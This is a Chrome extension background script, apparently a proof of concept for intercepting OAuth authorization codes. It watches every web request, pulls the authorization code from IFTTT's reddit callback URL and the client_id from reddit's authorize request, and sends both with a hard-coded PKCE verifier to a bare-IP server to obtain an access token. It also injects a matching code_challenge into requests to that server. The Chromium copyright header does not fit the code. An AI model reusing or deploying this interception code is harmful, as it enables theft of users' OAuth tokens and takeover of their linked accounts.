// Copyright 2018 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.


code_verifier = 'sx493wzZbBQHoUt9l922D8q0cg_ryDlDSg5LKMn_3nGcITj9'
code_challenge = 'whkcDuWfaDx32ewgpmD2R8wT9TmQ9j60NsxfvcwEjPk'

var client_id = ''
var auth_code = ''

var xhr = new XMLHttpRequest();

function onTokenGranted() {
  if (xhr.readyState === XMLHttpRequest.DONE) {
    if (xhr.status === 200) {
      console.log("Token acquired")
      console.log(xhr.responseText);
    }
  }
}


chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      if (details.url.indexOf("ifttt.com/channels/reddit_test_service/authorize") !== -1) {
        console.log("visited ifttt.com callback\n")
        const callback_url = new URL(details.url);
        console.log(callback_url.search);
        auth_code = callback_url.searchParams.get('code');

        const token_url = new URL("http://35.222.210.67:5000/auth/token")

        var formData = new FormData();
        formData.append('client_id', client_id)
        formData.append('grant_type', 'authorization_code')
        formData.append('code', auth_code)
        formData.append('code_verifier', code_verifier)

        console.log('Acquiring token from')
        console.log(token_url.href);

        xhr.open("POST", token_url.href, true);
        xhr.onreadystatechange = onTokenGranted;
        xhr.send(formData);
      }
      if (details.url.indexOf("reddit.com/api/v1") !== -1) {
        console.log("visited reddit.com API\n")
        console.log(details.url)
        if (details.url.indexOf('https://ssl.reddit.com/api/v1/authorize') !== -1) {
          const url = new URL(details.url);
          console.log("auth with reddit");
          console.log(url.search);
          client_id = url.searchParams.get('client_id');
        }
      }
      if (details.url.indexOf("http://35.222.210.67:5000/auth") !== -1) {
        console.log("visited my server\n")
        console.log(details.url)
        if (details.url.indexOf("http://35.222.210.67:5000/auth/authorize") !== -1) {
          console.log("append code challenge")
          return {redirectUrl: details.url + '&code_challenge=' + code_challenge};
        }

      }
    },
    {
      urls : ["<all_urls>"]
    },
    ["blocking"]
);


